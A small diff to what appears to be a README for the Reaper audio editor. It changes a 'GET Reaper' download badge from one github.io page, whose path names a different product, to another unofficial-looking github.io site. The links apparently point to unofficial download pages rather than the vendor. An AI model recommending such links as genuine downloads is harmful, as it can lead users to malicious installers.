@@ -3,7 +3,7 @@
 
 ![Reaper](https://img.youtube.com/vi/CkdksJGg214/maxresdefault.jpg)
 
-[![GET Reaper](https://img.shields.io/badge/GET%20%E2%80%94%20Reaper-0078D6?style=for-the-badge&logoColor=white)](https://newlonmediaraef.github.io/.github/n-track-studio-download)
+[![GET Reaper](https://img.shields.io/badge/GET%20%E2%80%94%20Reaper-0078D6?style=for-the-badge&logoColor=white)](https://reaper-audio-editor.github.io/.github/)
 
 ---
 
